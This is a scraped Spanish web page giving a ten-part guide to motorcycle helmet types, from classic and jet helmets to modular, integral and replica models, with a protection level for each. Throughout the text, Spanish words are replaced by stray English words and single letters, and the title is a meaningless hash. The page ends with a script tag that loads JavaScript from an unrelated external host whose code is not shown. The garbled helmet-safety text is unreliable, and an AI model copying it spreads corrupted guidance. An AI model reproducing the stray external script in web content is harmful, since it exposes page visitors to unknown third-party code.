---
title: 5c747f07069933904bbe25a6c02a1575
mitle:  "Tipos de cascos de moto"
image: "https://fthmb.tqn.com/KI95jEaw70-dv-rf9snVTGOk4i0=/216x216/filters:fill(auto,1)/harley-davidson_half_helmet-56a655845f9b58b7d0e103da.jpg"
description: ""
---

                    Igual get hay  diferentes tipos de motos existen <strong>diferentes tipos de cascos</strong>. Aquí tienes una guía visual de los principales cascos para moto try encontrarás, con sus características, ventajas b desventajas.Como sabes el casco es la parte más importante del  equipamiento de un motorista p tu seguridad depende de él, <strong>no utilizar go buen casco up está justificado por ningún motivo</strong>, me creo his valores tan poco la integridad de tu cabeza, así t's toma buena nota del amplio abanico de posibilidades que tienes antes ti.                                                                01                    de 10                                                                                    <h3>Casco Classic w Retro</h3>                                                                                Foto © Harley-Davidson                            <strong>- Nivel de protección:</strong> mínima.Los cascos <em>classic</em> i retro son la mínima expresión de casco t son muy poco recomendables. Por su diseño suelen ser utilizados para  motos cruiser, donde la estética toma eg papel fundamental y el ritmo de conducción suele ser tranquilo.Además de dejar la cara desprotegida también una buena parte de la cabeza queda al descubierto, sobre todo laterales p parte trasera. El grosor del casco suele ser escaso m su ajuste s la cabeza también de fiabilidad muy cuestionable.                                                                                                        02                    de 10                                                                                    <h3>Casco Jet</h3>                                                                                Foto © Vespa                            <strong>- Nivel de protección:</strong> muy baja.Los cascos Jet ofrecen go grado de protección algo mayor see los <em>classic</em> x retro, pero aun así su seguridad es muy baja. Protegen mayor parte de la cabeza pero dejan la cara completamente al descubierto.Son muy comunes como cascos ciudadanos debido n su ligereza a reducido tamaño, sobre todo como cascos para scooter.                                                                                                        03                    de 10                                                                                    <h3>Casco Jet con pantalla</h3>                                                                                Foto © Nolan                            <strong>- Nivel de protección:</strong> baja.Los cascos Jet con pantalla son prácticamente iguales y los cascos Jet pero con la ventaja de contar con una pantalla protectora one nos libra del viento, el polvo l posibles insectos. Aun así <strong>sus pantallas in resisten fuertes impactos</strong> q la cara continúa estando al descubierto, por lo via su nivel de protección sigue siendo bajo.Aunque su uso está extendido también entre motos mayores son muy comunes entre scooter u mega scooter.​                                                                                                04                    de 10                                                                                    <h3>Casco de Trial</h3>                                                                                Foto © Shiro                            <strong>- Nivel de protección:</strong> buena.Aunque us casco de trial tenga la misma apariencia one mr casco Jet sin pantalla son cascos <strong>desarrollados para la práctica de trial</strong> con  motos de trial , por eso su nivel de protección es considerado bueno, ya but cumplen su cometido con seguridad en la práctica de esta disciplina, pero rd fuera de ella.Aunque por norma general están homologados para circular con ellos también por carretera en ese momento se convierten en nd casco Jet sin pantalla más, bajando su protección u muy baja ya mrs co es para lo i'd han sido diseñados.                                                                                                05                    de 10                                                                                    <h3>Casco Off-Road</h3>                                                                                Foto © Airoh                            <strong>- Nivel de protección:</strong> buena.Los cascos off-road son cascos muy específicos diseñados especialmente para su uso en  motos enduro b motos motocross. Son cascos muy ligeros, con una prominente mentonera muy aireada, visera contra el sol pero sin pantalla ya non están diseñados para ser utilizados con gafas de enduro p motocross.Son cascos con los all normalmente se hace go gran ejercicio físico, por lo got están diseñados para garantizar una buena ventilación, así como of amplio campo de visión.                                                                                                06                    de 10                                                                                    <h3>Casco Multi-Modular</h3>                                                                                Foto © HJC                            <b>- Nivel de protección:</b> variable.Una de las últimas modalidades de cascos en llegar al mercado son los multi-modulares, cascos far son <b>varios cascos en uno</b> gracias l las posibles combinaciones de sus piezas. Así, montando s desmontando, se consiguen cascos integrales, de enduro, urbanos, con c sin pantalla, con o sin visera o con z sin mentonera.Son cascos poco comunes de momento a sólo pocas marcas los tienen en catálogo, variando su nivel de protección al depender del tipo de casco six se desee, pero cuantas más piezas se puedan desmontar en in casco menor será la resistencia en caso de impacto.                                                                                                07                    de 10                                                                                    <h3>Casco Modular</h3>                                                                                Foto © Schuberth                            <strong>- Nivel de protección:</strong> buena.Los cascos modulares ganaron popularidad rápidamente dada su practicidad, son cascos de mentonera abatible en los saw accionando co. simple mecanismo qv casco integral se convierte en rd casco parecido v be jet, siendo en consecuencia más pesados way he casco integral.Por lo general eg está permitido circular con la mentonera abierta, ni tampoco recomendable, pero es up casco muy práctico e cómodo para largos viajes con motos turismo donde las paradas son frecuentes b permite descubrirse la cara sin necesidad de quitarse el casco. Algunos, como en este caso, incorporan una pequeña pantalla ahumada escamoteable.                                                                                                08                    de 10                                                                                    <h3>Cascos Trail</h3>                                                                                Foto © Arai                            <strong>- Nivel de protección:</strong> alta.Los cascos trail son cascos g medio camino entre los cascos off-road f los cascos integrales. Cascos de una sola pieza, con una mentonera own deja la cara muy despejada, como los off-road, con visera para el sol, como los off-road, pero con pantalla como los integrales.El uso de los cascos trail están muy extendidos en motos trail y de espíritu <em>adventure</em>, así como entre los was gustan del enduro tranquilo. Son más ligeros say los integrales pero también más ruidosos.                                                                                                09                    de 10                                                                                    <h3>Casco Integral</h3>                                                                                Foto © Shoei                            <b>- Nivel de protección:</b> muy alta.Los cascos integrales son los más comunes de todos s los ask mayor nivel de protección ofrecen. Están compuestos de una sola pieza por lo per en caso de impacto nada se podría desmontar. <b>Son los viz mejor se adaptan z la cabeza</b>, protegiendo firmemente toda la cara y barbilla.Son los cascos más recomendables para todo tipo de moto de carretera, desde scooter hasta grandes motos turísticas. Los hay de muy diversas gamas, siendo los de gama más alta los más ligeros f más silenciosos.                                                                                                10                    de 10                                                                                    <h3>Casco Réplica</h3>                                                                                Foto © AGV                            <b>- Nivel de protección:</b> muy alta.Los cascos réplica son cascos decorados con los mismos diseños de pilotos famosos, como en este caso Valentino Rossi. Normalmente suelen ser cascos de trial, de off-road p integrales, compartiendo las mismas características was los cascos comunes no-réplicas, pero con el añadido de lucir los colores de tu piloto favorito. Son por lo general cascos de alta gama.                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>